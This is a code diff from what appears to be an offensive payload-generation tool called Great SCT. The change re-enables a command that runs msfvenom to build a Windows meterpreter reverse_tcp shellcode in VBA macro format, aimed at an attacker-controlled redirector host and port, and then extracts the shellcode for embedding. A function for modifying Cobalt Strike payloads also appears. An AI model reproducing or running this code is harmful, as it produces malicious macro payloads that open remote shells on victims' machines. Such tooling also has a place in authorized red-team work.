@@ -2,10 +2,11 @@
 from uuid import uuid4
 from string import ascii_uppercase, digits
 from random import choice
-from shutil import copyfile
+from shutil import copyfile, which
 from fileops import fileFindReplace
 import re
 from os import system
+from sys import exit
 from encoder import encodeStringAsChr, convertToVBAFormat
 
 '''
@@ -249,16 +250,18 @@ def getMetasploitShellCode(redirector):
 	Returns string of shellcode
 	'''
 	code = ''
-	# system('msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f vba > /tmp/metasploitvba'.format(redirector[0], redirector[1]))
-	for line in open('/tmp/metasploitvba', 'r'):
-		code += line
+	if which('msfvenom'):
+		system('msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f vba > /tmp/metasploitvba'.format(redirector[0], redirector[1]))
+		for line in open('/tmp/metasploitvba', 'r'):
+			code += line
 
-	shellCode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", code, flags=re.MULTILINE)
-	msfShellCode = ''.join(i[0].replace('', '') for i in shellCode)
+		shellCode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", code, flags=re.MULTILINE)
+		msfShellCode = ''.join(i[0].replace('', '') for i in shellCode)
 
-	print(msfShellCode)
-	
-	return msfShellCode
+		return msfShellCode
+	else:
+		print('[-] ERROR: msfvenom is not installed on the system. Please install msfvenom to use Great SCT.')
+		exit()
 
 def modifyCobaltStrikePayload(cspayload, x86, x64):
 	'''
